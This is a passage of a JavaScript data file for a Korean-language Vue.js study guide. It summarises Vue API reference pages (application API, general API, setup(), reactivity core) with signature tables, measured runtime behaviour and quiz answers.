            body: "(1) 클래스 기반입니다. const shaking = ref(false)와 :class=\"{ shake: shaking }\", CSS .shake { animation: shake .5s }. 실패마다 shaking을 true로 하고 애니메이션 끝에 false로 되돌려야 다음 실패에 다시 붙습니다. setTimeout(…, 500) 대신 @animationend=\"shaking = false\"가 지속 시간과 정확히 맞습니다. 이미 true인 상태에서 다시 실패하면 클래스 변화가 없으니, 먼저 false로 만들고 await nextTick() 뒤 true로 하거나 key를 바꿔 요소를 새로 만듭니다. (2) 상태 기반입니다. 슬라이더 v-model.number=\"angle\"과 :style=\"{ transform: `perspective(600px) rotateY(${angle}deg)` }\". 사용자 입력이 시간을 돌리고 Vue는 값마다 style을 맞춥니다. transform은 합성 스레드라 싸고, 드래그 중 부드럽게 하려면 CSS transition: transform .1s를 더해 중간을 CSS가 채우게 합니다. (3) FLIP의 First(옛 위치)는 DOM 갱신 '전', Last(새 위치)는 '후'에 재야 합니다. 상태를 바꾸기 직전(핸들러 안)에 각 요소의 getBoundingClientRect를 맵에 저장하고, 상태를 바꾼 뒤 watch(list, …, { flush: 'post' }) 또는 await nextTick() 뒤 다시 재어 차이를 transform으로 역적용하고 다음 프레임에 전환으로 0으로 돌립니다. flush: 'pre'나 변경 직후에 재면 갱신 전 DOM입니다(실제로 pre는 옛 DOM, post는 새 DOM). 보통은 <TransitionGroup>의 move가 이것을 대신합니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Animation Techniques", href: `${DOCS}/guide/extras/animation` },
      { label: "Transition", href: `${DOCS}/guide/built-ins/transition` },
      { label: "TransitionGroup — Move Transitions", href: `${DOCS}/guide/built-ins/transition-group#move-transitions` },
    ],
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // API 참고서 (API Reference)
  // ═══════════════════════════════════════════════════════════════════════════
  {
    id: "va",
    name: "API 참고서",
    tagline: "같은 개념을 두 벌로 적어 둔 쪽",
    intro:
      "가이드가 '왜'와 '어떤 순서로'를 다룬다면 여기는 시그니처와 반환값, 그리고 쓰면 안 되는 경우를 적는 자리입니다. 여섯 갈래로 나뉘어 있고, 그중 둘(Composition API·Options API)은 같은 것을 다른 문법으로 적은 것이라 한쪽을 알면 다른 쪽은 대응표처럼 읽힙니다. 이 노드의 자식 여섯이 그 갈래이고, 각 갈래 아래 노드가 페이지입니다. 페이지 28입니다. 각 시트는 그 페이지의 항목 전부를 한 줄씩 적고, 가이드 쪽에서 측정한 결과 중 그 항목의 '주의 사항'을 뒷받침하는 것을 붙였습니다.",
    blocks: [
      {
        label: "여섯 갈래",
        body: "글로벌 API(애플리케이션·일반), Composition API(setup·반응성 코어·유틸리티·고급·라이프사이클·의존성 주입·헬퍼), Options API(상태·렌더링·라이프사이클·컴포지션·기타·컴포넌트 인스턴스), 내장 기능(디렉티브·컴포넌트·특수 엘리먼트·특수 속성), 싱글 파일 컴포넌트(문법 명세·script setup·CSS 기능), 고급 API(커스텀 엘리먼트·렌더 함수·SSR·유틸리티 타입·커스텀 렌더러·컴파일 타임 플래그)입니다.",
      },
      {
        label: "반응성이 셋으로 나뉜 이유",
        body: "코어는 ref·reactive·computed·watch처럼 매일 쓰는 것, 유틸리티는 isRef·unref·toRef처럼 값의 모양을 다루는 것, 고급은 shallowRef·markRaw·customRef처럼 추적을 일부러 끄거나 직접 만드는 것입니다. 고급 쪽은 반응성이 '추적'이라는 사실을 알아야 읽히는 자리라, 가이드의 반응성 심화를 먼저 보는 편이 순서에 맞습니다.",
      },
      {
        label: "싱글 파일 컴포넌트가 따로 있는 이유",
        body: "<script setup>의 defineProps·defineEmits·defineModel은 import 없이 쓰는 컴파일러 매크로이고, <style scoped>와 v-bind() in CSS도 컴파일 시점에 처리됩니다. 런타임 API가 아니라 컴파일러의 기능이라 갈래가 따로입니다. 런타임 문서에서 찾다가 없으면 여기를 보면 됩니다.",
        code: "<script setup lang=\"ts\">\n// import 없이 쓴다 — 컴파일러가 알아보는 매크로\nconst model = defineModel<string>({ required: true });\nconst emit = defineEmits<{ change: [value: string] }>();\n</script>",
      },
      {
        label: "내장 기능은 문법이 아니라 API다",
        body: "v-if·v-for·v-model 같은 디렉티브, Transition·KeepAlive·Teleport 같은 컴포넌트, <component>·<slot> 같은 특수 엘리먼트, key·ref·is 같은 특수 속성이 한 갈래에 모여 있습니다. 템플릿에 쓰는 것이라 문법처럼 보이지만 인자와 수식어가 정해진 API라서, 가이드가 아니라 참고서에 자리를 둔 것으로 읽었습니다.",
      },
      {
        label: "참고서를 읽는 법과 측정의 배치",
        body: "참고서 페이지는 항목마다 타입(시그니처), 세부(동작 규칙), 예제로 되어 있고, 버전 표시(3.3+·3.4+·3.5+)가 붙은 항목이 있습니다. 이 노드의 시트는 그 항목을 표로 한 줄씩 적고 '실제로 돌려 보면'에는 가이드 쪽에서 측정한 것 중 그 항목의 세부 규칙을 보여 주는 것만 골라 붙였습니다. 예를 들어 reactivity-core의 computed 항목에는 '생성 직후 runs 0, 두 번 읽어도 1, readonly 쓰기 경고', application의 app.mount에는 '두 번 부르면 App has already been mounted.'. 측정의 자세한 맥락은 가이드 시트에 있고 참고서 시트는 그것을 가리킵니다.",
        code: "갈래              페이지                                                              대표 측정 (가이드에서)\n글로벌 API         애플리케이션 · 일반                                                   mount 두 번 경고 · errorHandler info · idPrefix · 전역 등록 범위\nComposition API    setup · 반응성 코어 · 유틸리티 · 고급 · 라이프사이클 · 의존성 주입 · 헬퍼        computed 지연·캐시 · watch flush · 구조 분해 끊김 · shallowRef · effectScope · 훅 순서 · provide ref · useId\nOptions API        상태 · 렌더링 · 라이프사이클 · 컴포지션 · 기타 · 컴포넌트 인스턴스               data $·_ 접두 · $el 다중 루트 · template 문자열 SSR\n내장 기능          디렉티브 · 컴포넌트 · 특수 엘리먼트 · 특수 속성                           v-model 수식어 · 수식어 순서 · Transition 프레임 · KeepAlive LRU · Teleport · key 리셋\nSFC               문법 명세 · <script setup> · CSS 기능                                 compileScript 매크로 치환 · compileStyle 해시 · v-bind()\n고급 API           커스텀 엘리먼트 · 렌더 함수 · SSR · 유틸리티 타입 · 커스텀 렌더러 · 컴파일 플래그   renderToString · ctx.teleports · useSSRContext · 요청 간 오염 · 빌드 크기",
        codeLang: "text",
      },
    ],
    sources: [
      { label: "API Reference", href: `${DOCS}/api/` },
      { label: "Reactivity: Core", href: `${DOCS}/api/reactivity-core` },
      { label: "<script setup>", href: `${DOCS}/api/sfc-script-setup` },
    ],
  },

  {
    id: "va-global",
    name: "글로벌 API",
    tagline: "앱 인스턴스(createApp · app.*) 와 어디서나 부르는 함수(nextTick · defineComponent · defineAsyncComponent · defineCustomElement)",
    intro:
      "참고서 첫 갈래, 두 페이지입니다. 애플리케이션 API(createApp·createSSRApp·app.mount·unmount·onUnmount·component·directive·use·mixin·provide·runWithContext·version·config.*)와 일반 API(version·nextTick·defineComponent·defineAsyncComponent·defineCustomElement). 전자는 '앱 인스턴스가 가진 것', 후자는 '컴포넌트 밖에서도 부르는 전역 함수'입니다. 실제로 돌려 보면 app.mount를 두 번 부르니 'App has already been mounted.', errorHandler의 info가 'setup function'·'render function', app.config.idPrefix로 useId가 'app-0', app.directive 전역 등록이 자식 템플릿에서 동작, nextTick이 Promise를 돌려주고 그 뒤 DOM이 갱신돼 있었습니다.",
    blocks: [
      {
        label: "두 페이지 한눈에",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "페이지          항목                                                                                     측정\n애플리케이션     createApp · createSSRApp · app.mount/unmount/onUnmount · component · directive · use · mixin(비권장) · provide · runWithContext(3.3+) · version · config.{errorHandler, warnHandler, performance, compilerOptions, globalProperties, optionMergeStrategies, idPrefix, throwUnhandledErrorInProduction}   mount ×2 경고 · errorHandler info · idPrefix 'app-0' · 전역 directive 범위\n일반           version · nextTick · defineComponent(3.3+ 함수 시그니처) · defineAsyncComponent · defineCustomElement      nextTick Promise · 비동기 컴포넌트 loading/error/timeout",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "자식 둘, 애플리케이션 API와 일반 API입니다.",
      },
    ],
    sources: [
      { label: "Application API", href: `${DOCS}/api/application` },
      { label: "Global API: General", href: `${DOCS}/api/general` },
    ],
  },

  {
    id: "va-global-app",
    name: "애플리케이션 API",
    tagline: "createApp 이 돌려주는 app 의 전부: mount 한 번, 등록 메서드는 체이닝, config 는 mount 전",
    intro:
      "참고서 애플리케이션 API 페이지입니다. createApp(rootComponent, rootProps?)과 createSSRApp(같은 인자, 하이드레이션 모드). app.mount(container)는 요소나 선택자를 받아 안을 교체하고 루트 컴포넌트 인스턴스를 돌려주며 '앱마다 한 번만'. 루트에 template·render가 없고 컴파일러가 있으면 컨테이너 innerHTML이 템플릿. app.unmount(), app.onUnmount(cb). app.component(name[, def])·app.directive(name[, def])는 등록(this 반환, 체이닝) 또는 조회. app.use(plugin, ...options)는 '같은 플러그인은 한 번만 설치'. app.mixin은 '권장하지 않음'. app.provide(key, value). app.runWithContext(fn)(3.3+)는 컴포넌트 밖에서 inject를 쓰게 함. app.version. app.config: errorHandler(err, instance, info. 출처 7종. 운영은 코드), warnHandler(개발만), performance(DevTools 타임라인), compilerOptions(isCustomElement·whitespace·delimiters·comments. 전체 빌드에서만), globalProperties, optionMergeStrategies, idPrefix, throwUnhandledErrorInProduction. 실제로 돌려 보면 mount 두 번 경고, errorHandler info, onErrorCaptured false로 차단, idPrefix 'app-0', 전역 directive가 자식에서 동작, 서버에서 앱을 요청마다 만들어도 모듈 전역은 공유. 이 노드의 질문은 하나입니다. app 객체에 무엇이 있고 언제 불러야 하나.",
    blocks: [
      {
        label: "항목",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "항목                              시그니처 / 뜻                                                       세부\ncreateApp(root, rootProps?)        App 인스턴스                                                        root 는 컴포넌트 객체 · rootProps 는 루트에 줄 props\ncreateSSRApp(root, rootProps?)     같되 하이드레이션 모드                                                 서버 HTML 에 붙임 · 불일치는 고침\napp.mount(container)               Element | string → 루트 컴포넌트 인스턴스                                안을 교체 · template/render 없으면 innerHTML 템플릿(컴파일러 있을 때) · 한 번만\napp.unmount()                      트리 언마운트                                                       자식 훅 전부\napp.onUnmount(cb)                  언마운트 콜백\napp.component(name[, Comp])        등록(this) / 조회                                                   전역 · 트리 셰이킹 X\napp.directive(name[, Dir])         등록(this) / 조회                                                   객체 또는 함수 꼴\napp.use(plugin, ...options)        플러그인 설치 (install(app, options))                                 같은 플러그인은 한 번만\napp.mixin(mixin)                   전역 믹스인                                                         비권장 (컴포저블로)\napp.provide(key, value)            앱 전체 provide                                                     플러그인에서 흔함\napp.runWithContext(fn)             3.3+ · fn 안에서 inject 가 앱 provide 를 봄                              컴포넌트 밖 · 동기\napp.version                        Vue 버전 문자열                                                     플러그인 호환 검사\napp.config.errorHandler            (err, instance, info) · 7 출처 · 기본: 개발 throw · 운영 로그             운영 info 는 코드\napp.config.warnHandler             (msg, instance, trace) · 개발만\napp.config.performance             DevTools 타임라인 추적 · 개발만\napp.config.compilerOptions         isCustomElement · whitespace('condense'|'preserve') · delimiters · comments   전체 빌드에서만 · 컴포넌트 옵션으로 덮음\napp.config.globalProperties        템플릿·this 전역 · 드물게                                             컴포넌트 프로퍼티가 우선\napp.config.optionMergeStrategies   커스텀 옵션 병합 함수 (to, from)\napp.config.idPrefix                useId 접두                                                          여러 앱\napp.config.throwUnhandledErrorInProduction   운영에서도 throw · 기본 false",
        codeLang: "text",
      },
      {
        label: "실제로 돌려 보면",
        body: "Chrome: app.mount(el) 뒤 app.mount(el2) → '[Vue warn]: App has already been mounted.'(던지지 않음). errorHandler: setup throw → info 'setup function', 템플릿 식 에러 → 'render function'. 중간 onErrorCaptured가 false → errorHandler 미호출. app.config.idPrefix = 'app' → useId 'app-0'·'app-1'. app.directive('dir', …) → 자식 템플릿에서 동작, 컴포넌트 directives 옵션은 자식에서 'Failed to resolve directive'. Node: 요청마다 createSSRApp해도 모듈 전역 reactive는 공유(shared=1 → 2). 템플릿 문자열 컴포넌트가 서버에서 컴파일됨(서버 빌드는 전체 빌드). renderToString(app, ctx)의 ctx에 teleports와 useSSRContext로 적은 값이 모임. 자세한 맥락은 가이드의 애플리케이션 생성·플러그인·SSR 노드.",
        code: "app.mount ×2                 → warn: App has already been mounted.\nerrorHandler(err, i, info)    → 'setup function' · 'render function'   (onErrorCaptured false 면 미호출)\nconfig.idPrefix = 'app'       → useId 'app-0'\napp.directive 전역            → 자식 템플릿 ✓   (컴포넌트 directives 옵션은 ✗)\ncreateSSRApp 요청마다          → 모듈 전역은 공유 (shared 1 → 2)\nrenderToString(app, ctx)      → ctx.teleports · ctx.* (useSSRContext)",
        codeLang: "text",
      },
      {
        label: "문제의 구조: app 은 '트리 전체에 적용되는 것' 의 그릇이라 mount 전에 채우고, 한 번만 붙인다",
        body: "등록 메서드(component·directive·use·provide)와 config는 트리 전부에 영향을 주므로 mount 전에 끝내야 하고, mount는 루트 인스턴스를 돌려주며 한 번만입니다. 그릇 밖(모듈 전역)은 앱이 여럿이거나 요청이 여럿이어도 공유되므로 SSR에서 샙니다. errorHandler는 트리의 에러가 위로 흘러 모이는 끝이고 중간 onErrorCaptured가 끊을 수 있습니다. compilerOptions는 런타임 컴파일러가 있을 때(전체 빌드)만 뜻이 있어 빌드 환경에서는 빌드 도구 옵션으로 갑니다.",
      },
      {
        label: "다음 입구",
        body: "다음 페이지 '일반 API'는 앱 인스턴스 밖의 전역 함수들입니다. nextTick·defineComponent·defineAsyncComponent·defineCustomElement.",
      },
      {
        label: "확인 질문",
        body: "(1) 플러그인 안에서 inject로 다른 플러그인이 provide한 값을 읽어야 합니다. (2) 커스텀 엘리먼트 태그를 쓰는데 빌드가 Vite인데 app.config.compilerOptions.isCustomElement가 안 먹습니다. (3) 운영에서 에러를 던지게 하고 싶습니다.",
        notes: [
          {
            title: "답",
            body: "(1) install(app) 안에서는 컴포넌트 컨텍스트가 없어 inject를 바로 못 부릅니다. app.runWithContext(() => inject(Key))(3.3+)로 앱의 provide를 보게 하거나, app._context를 쓰지 말고 다른 플러그인이 export한 키로 app.provide된 값을 runWithContext로 읽습니다. 설치 순서(그 플러그인이 먼저 use)도 맞춰야 합니다. (2) compilerOptions는 런타임 컴파일러(전체 빌드)가 템플릿을 컴파일할 때만 적용됩니다. Vite는 빌드 때 @vitejs/plugin-vue가 컴파일하므로 vite.config의 vue({ template: { compilerOptions: { isCustomElement } } })에 두어야 합니다(문서 경고: 전체 빌드에서만 존중). (3) app.config.throwUnhandledErrorInProduction = true(3.5+). 기본은 운영에서 로그만 남깁니다. 보통은 던지는 대신 errorHandler에서 모니터링으로 보내는 쪽이 사용자에게 안전하고, info가 운영에서는 코드이니 에러 참고서로 복원합니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Application API", href: `${DOCS}/api/application` },
      { label: "Creating an Application", href: `${DOCS}/guide/essentials/application` },
    ],
  },

  {
    id: "va-global-general",
    name: "일반 API",
    tagline: "version · nextTick · defineComponent · defineAsyncComponent · defineCustomElement",
    intro:
      "참고서 일반 API 페이지입니다. 다섯입니다. version(현재 Vue 버전). nextTick(cb?) → Promise<void>(다음 DOM 갱신 뒤. 상태 변경은 묶여 동기 적용되지 않으니 그 뒤를 기다릴 때. this.$nextTick도). defineComponent(options) → 타입 추론용 런타임 no-op(InstanceType<typeof Comp>로 인스턴스 타입. 3.3+ 함수 시그니처 defineComponent(setup, extraOptions)로 제네릭 TSX. webpack 트리 셰이킹엔 /*#__PURE__*/). defineAsyncComponent(loader | { loader, loadingComponent, errorComponent, delay, timeout, suspensible, onError }). defineCustomElement(options, { styles, shadowRoot, nonce, configureApp })(고급 API 노드에 세부). 실제로 돌려 보면 nextTick은 Promise를 돌려주고 await 뒤 DOM이 '2-1'로 갱신돼 있었고(직전은 '0-0'), defineAsyncComponent는 loading → 도착 / error / timeout을 각각 그렸으며, version은 '3.5.45'였습니다. 이 노드의 질문은 하나입니다. 컴포넌트 밖에서 부르는 다섯은 각각 무엇을 돌려주나.",
    blocks: [
      {
        label: "항목",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "항목                          시그니처                                                              세부\nversion                        string                                                              '3.5.45' (측정)\nnextTick(cb?)                  Promise<void>                                                       다음 DOM 갱신 뒤 · await 또는 콜백 · this.$nextTick\ndefineComponent(options)       ComponentConstructor (런타임 no-op · 타입 추론)                            InstanceType<typeof Foo> · 3.3+ defineComponent(setup, { props }) 함수 꼴 · /*#__PURE__*/ (webpack)\ndefineAsyncComponent(src)      Component                                                           src: loader | { loader, loadingComponent, errorComponent, delay(200), timeout(Infinity), suspensible, onError(err, retry, fail, attempts) } · 3.5+ hydrate\ndefineCustomElement(opts, o?)  CustomElementConstructor                                             styles · shadowRoot(3.5+) · nonce(3.5+) · configureApp(3.5+) → customElements.define",
        codeLang: "text",
      },
      {
        label: "실제로 돌려 보면",
        body: "Chrome: a·b·a를 바꾼 직후 DOM '0-0', const p = nextTick()은 Promise, await p 뒤 DOM '2-1'·렌더 1회 추가. defineAsyncComponent: delay 0 + loadingComponent → 첫 렌더 'loading…', 120ms 로더 → 'lazy 도착', 500 응답 → errorComponent 'Failed to fetch dynamically imported module…', timeout 50 → 'Async component timed out after 50ms.', onError attempts=1 → fail(). Suspense 안에서는 Suspense가 로딩을 맡음(suspensible 기본). version '3.5.45'. defineComponent로 감싼 컴포넌트와 보통 객체는 런타임 동작이 같았습니다(타입용). 자세한 맥락은 반응성 기초(nextTick)·비동기 컴포넌트·TS 개요 노드.",
        code: "nextTick:  set 직후 DOM '0-0' → await nextTick() → '2-1'  (Promise)\ndefineAsyncComponent:  'loading…' → 'lazy 도착' / errorComponent(Failed to fetch…) / timeout(Async component timed out after 50ms.) · onError attempts=1\nversion:   '3.5.45'",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 넷은 '정의' 이고 하나는 '시점' 이다",
        body: "defineComponent·defineAsyncComponent·defineCustomElement는 컴포넌트 정의를 감싸 다른 성질(타입 추론, 지연 로딩, 네이티브 요소)을 더하는 함수이고 런타임 비용은 작거나 없습니다. nextTick만 시점을 다루는 함수로, 묶음 갱신이 끝난 뒤를 기다리는 유일한 공식 길입니다. 상태를 바꾼 직후 DOM을 읽으려면 nextTick이고, 그것은 반응성의 '다음 틱' 설계의 다른 면입니다.",
      },
      {
        label: "다음 입구",
        body: "다음 갈래 'Composition API'는 setup 안에서 부르는 함수들입니다. 일곱 페이지.",
      },
      {
        label: "확인 질문",
        body: "(1) 상태를 바꾼 뒤 추가된 요소로 스크롤하려는데 요소가 없습니다. (2) 모달 컴포넌트를 처음 열 때만 받고, 로딩이 200ms 안에 끝나면 스피너를 안 보이게. (3) JSX 제네릭 컴포넌트를 defineComponent로 만들려면?",
        notes: [
          {
            title: "답",
            body: "(1) 변경은 다음 틱에 DOM이 됩니다(실제로 직후 '0-0'). await nextTick() 뒤 el.scrollIntoView()하거나, 이벤트 핸들러 밖이면 watch(list, …, { flush: 'post' })에서 합니다. nextTick은 Promise라 async 핸들러 안에서 await하면 됩니다. (2) defineAsyncComponent({ loader: () => import('./Modal.vue'), loadingComponent: Spinner, delay: 200 }). delay 기본값이 200ms라 그 안에 끝나면 스피너가 아예 보이지 않고(실제로 delay 0에서는 즉시 보임), timeout과 errorComponent도 함께 둡니다. 모듈 최상위에 한 번 만들어 재사용합니다. (3) 3.3+ 함수 시그니처입니다. const List = defineComponent(<T,>(props: { items: T[]; render: (t: T) => JSX.Element }) => () => <ul>{props.items.map(props.render)}</ul>, { props: ['items', 'render'] }). 런타임 props는 둘째 인자에 손으로 선언해야 하고, tsconfig에 jsx: 'preserve'·jsxImportSource: 'vue'. SFC면 <script setup generic=\"T\">가 더 간단합니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Global API: General", href: `${DOCS}/api/general` },
      { label: "Async Components", href: `${DOCS}/guide/components/async` },
    ],
  },

  {
    id: "va-composition",
    name: "Composition API",
    tagline: "setup 안에서 부르는 함수 일곱 묶음: setup, 반응성 코어·유틸리티·고급, 라이프사이클, 의존성 주입, 헬퍼",
    intro:
      "참고서 둘째 갈래, 일곱 페이지입니다. setup()(함수 자체와 props·context), 반응성 코어(ref·computed·reactive·readonly·watchEffect·watchPostEffect·watchSyncEffect·watch·onWatcherCleanup), 유틸리티(isRef·unref·toRef·toValue·toRefs·isProxy·isReactive·isReadonly·isShallow), 고급(shallowRef·triggerRef·customRef·shallowReactive·shallowReadonly·toRaw·markRaw·effectScope·getCurrentScope·onScopeDispose), 라이프사이클(onMounted … onServerPrefetch), 의존성 주입(provide·inject·hasInjectionContext), 헬퍼(useAttrs·useSlots·useModel·useTemplateRef·useId). 공통 규칙은 '이 페이지의 모든 API는 setup 중 동기로'(라이프사이클·주입). 이 블로그의 Node 측정 대부분이 이 갈래의 함수들을 직접 부른 것입니다.",
    blocks: [
      {
        label: "일곱 페이지 한눈에",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "페이지              항목 수   대표 측정\nsetup()            1 + props · context         props 구조 분해 끊김 · expose 로 공개 범위 · setup 반환 렌더 함수\n반응성: 코어         9                         computed 지연·캐시·readonly 경고 · watch 소스/deep/flush · watchEffect await 뒤 미추적 · 묶음\n반응성: 유틸리티      9                         toRefs 양방향 · toRef(getter) · toValue · isReactive(nested) · unref\n반응성: 고급         10                        shallowRef + triggerRef · toRaw 정체 · markRaw · readonly 경고 · effectScope stop · customRef 디바운스\n라이프사이클          13                        부모/자식 순서 · 서버는 serverPrefetch 만 · KeepAlive activated/deactivated · 디렉티브 훅 순서\n의존성 주입          3                         ref provide 반응 · readonly inject 경고 · Teleport 안 inject · SSR provide\n헬퍼               5                         useTemplateRef null → 요소 · useId 'v-0' · idPrefix · useModel 컴파일 결과",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "첫 페이지 'setup()'부터입니다.",
      },
    ],
    sources: [
      { label: "Composition API: setup()", href: `${DOCS}/api/composition-api-setup` },
      { label: "Reactivity API: Core", href: `${DOCS}/api/reactivity-core` },
    ],
  },

  {
    id: "va-comp-setup",
    name: "setup()",
    tagline: "Composition API 의 진입점: props 는 반응형(구조 분해 X), context 는 { attrs, slots, emit, expose }, 반환은 객체 또는 렌더 함수",
    intro:
      "참고서 setup() 페이지입니다. <script setup>을 쓰지 않을 때(빌드 없음, Options API와 혼용) Composition API의 진입점입니다. setup(props, context). 반환 객체는 템플릿과 Options 훅(this)에 노출되고 ref는 풀립니다. 'setup 안에서 this는 인스턴스가 아님(undefined)'. '동기로 객체를 반환해야. async setup은 Suspense 자손에서만'. props는 반응형이라 '구조 분해하면 반응성을 잃음. props.xxx로 접근, 필요하면 toRefs(props)·toRef(props, 'x')'. context { attrs, slots, emit, expose }는 비반응형이라 구조 분해 가능하되 'attrs·slots는 갱신마다 바뀌는 상태 객체라 구조 분해 말고 attrs.x로 읽고 반응이 필요하면 onBeforeUpdate'. expose()로 템플릿 ref에 보일 것 제한(expose()만 부르면 닫힘). 렌더 함수를 반환할 수도 있고 그때 메서드 공개는 expose. 실제로 돌려 보면 setup(props, { attrs, slots, emit, expose })로 attrs 폴스루·slots.default?.()·expose({ pub })를 확인했고, expose하지 않은 값은 부모 ref에서 undefined, reactive 구조 분해는 끊겼고, 서버에서 async setup은 Suspense가 기다렸습니다. 이 노드의 질문은 하나입니다. setup이 받는 둘과 돌려주는 하나는 무엇인가.",
    blocks: [
      {
        label: "항목",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "setup(props, context) → object | () => VNode\n인자          타입 / 뜻                                              세부\nprops         반응형 객체 (선언된 props)                                  구조 분해 금지 → props.x · toRefs(props) · toRef(props, 'x')\ncontext.attrs  폴스루 속성 ($attrs)                                     비반응 · 상태 객체 (갱신마다 바뀜) · attrs.x 로 읽기 · 반응 필요하면 onBeforeUpdate\ncontext.slots  슬롯 함수 객체 ($slots)                                   같음 · slots.default?.()\ncontext.emit   emit 함수 ($emit)\ncontext.expose(obj?)  템플릿 ref 에 공개할 것 · expose() 만이면 닫힘           렌더 함수 반환 시 메서드 공개 통로\n반환          객체 → 템플릿·this 에 노출 (ref 풀림)   또는   렌더 함수          동기 · async 는 Suspense 자손만 · this 는 undefined",
        codeLang: "text",
      },
      {
        label: "실제로 돌려 보면",
        body: "Node: defineComponent({ props: {…}, emits: ['go'], setup(props, { attrs, slots, emit }) { return () => h('button', { class: 'btn' }, [slots.default?.() ?? '폴백', JSON.stringify(attrs)]) } })에 class·data-x·onOther를 넘기니 attrs에 class·data-x가 담기고 루트에 병합, 선언된 size·count·required는 props로(검증 경고). Chrome: setup(_, { expose }) { expose({ pub }); return { secret, pub } }인 자식의 부모 템플릿 ref는 child.pub '공개', child.secret undefined. expose를 안 부른 자식은 전부 보임. let { n } = reactive(…); n++ → 효과 안 돎(props도 같은 reactive라 같은 규칙). setup이 렌더 함수를 돌려주는 꼴로 Suspense·Teleport·KeepAlive 측정을 전부 했습니다. 서버: async setup() { await … } 자식을 Suspense로 감싸니 기다려 렌더(Suspense 없으면 불가). 라이프사이클: setup 안에서 등록한 훅이 동기면 어디서 불러도 됐고, 밖(setTimeout)은 경고.",
        code: "setup(props, { attrs, slots, emit, expose })\n  attrs → { class, 'data-x' } (선언 밖) · 루트 병합   ·   slots.default?.() ?? '폴백'   ·   expose({ pub }) → 부모 ref: pub ✓ · secret undefined\n  reactive 구조 분해 → 끊김 (props 도 같음)   ·   async setup → Suspense 안에서만 (서버도 기다림)",
        codeLang: "text",
      },
      {
        label: "문제의 구조: setup 은 '인스턴스 생성 시점에 한 번' 도는 함수라, 그 시점에 있는 것(props · context)만 받고 결과(객체 · 렌더 함수)를 남긴다",
        body: "setup은 beforeCreate·created 자리에서 한 번 실행됩니다. 그래서 this가 없고(인스턴스 프록시가 아직), props는 반응형 객체로 받되 그 순간 복사하면 끊기며, attrs·slots는 갱신마다 바뀌는 스냅샷이라 참조로 읽어야 합니다. 반환 객체는 템플릿의 스코프가 되고, 렌더 함수를 반환하면 템플릿을 대신합니다. <script setup>은 이 함수를 컴파일러가 만들어 주는 것이고(실제로 setup(__props, { expose: __expose, emit: __emit })), defineExpose·defineEmits가 context의 expose·emit입니다.",
      },
      {
        label: "다음 입구",
        body: "setup 안에서 가장 많이 부르는 아홉이 다음 페이지 '반응성: 코어'입니다.",
      },
      {
        label: "확인 질문",
        body: "(1) setup(props)에서 const { title } = props를 쓰고 title이 안 바뀝니다. (2) 렌더 함수를 반환하는 컴포넌트의 focus 메서드를 부모가 부르려면? (3) attrs.class가 바뀌는 것을 watch하려는데 안 됩니다.",
        notes: [
          {
            title: "답",
            body: "(1) props는 reactive 객체라 구조 분해하면 그 순간 값이 복사되어 끊깁니다(실제로 reactive 구조 분해 끊김). props.title로 읽거나 const { title } = toRefs(props)로 ref로 받습니다. <script setup>에서는 3.5의 반응형 구조 분해가 컴파일러 치환으로 해결하지만 setup() 함수에는 적용되지 않습니다. (2) 렌더 함수를 반환하면 다른 것을 반환할 수 없으니 context.expose({ focus })로 공개합니다. expose를 안 부르면 렌더 함수 반환 컴포넌트는 부모 ref에 아무것도 보이지 않습니다(실제로 expose한 것만 보임). (3) context.attrs는 비반응형이라 watch가 변화를 보지 못합니다(문서: 성능상 비반응). class를 prop으로 선언해 받거나, onBeforeUpdate/onUpdated 훅에서 attrs.class를 읽어 전과 비교합니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Composition API: setup()", href: `${DOCS}/api/composition-api-setup` },
      { label: "<script setup>", href: `${DOCS}/api/sfc-script-setup` },
    ],
  },

  {
    id: "va-comp-reactivity-core",
    name: "반응성: 코어",
    tagline: "ref · computed · reactive · readonly · watchEffect · watchPostEffect · watchSyncEffect · watch · onWatcherCleanup",
    intro:
      "참고서 반응성 코어 페이지입니다. 아홉 항목. ref(value) → Ref(깊은 변환, 중첩 ref 풀림. shallowRef로 피함). computed(getter(prev), debug?) → 읽기 전용 Ref, { get, set }이면 쓰기 가능. reactive(obj) → 깊은 프록시(프로퍼티의 ref 풀림, 배열·Map 안은 안 풀림, 프록시 ≠ 원본). readonly(obj) → 깊은 읽기 전용(쓰면 경고). watchEffect(fn(onCleanup), { flush: 'pre'|'post'|'sync', onTrack, onTrigger }) → WatchHandle(호출·pause·resume·stop). watchPostEffect·watchSyncEffect(flush 별칭). watch(source, cb(new, old, onCleanup), { immediate, deep: boolean | number(3.5+), flush, once(3.4+), onTrack, onTrigger }) → WatchHandle. onWatcherCleanup(fn, failSilently?)(3.5+. 동기 호출). 실제로 돌려 보면 computed 생성 직후 runs 0·두 번 읽어도 1·쓰기 경고 'Write operation failed: computed value is readonly', watch의 reactive 소스 깊음/getter 얕음/deep·immediate·once, flush 순서 sync → 동기 끝 → pre(옛 DOM) → post(새 DOM), watchEffect await 뒤 미추적, readonly 쓰기 'Set operation on key \"z\" failed: target is readonly.', reactive(1) 경고. 이 노드의 질문은 하나입니다. 아홉의 시그니처와 옵션은 무엇인가.",
    blocks: [
      {
        label: "항목",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
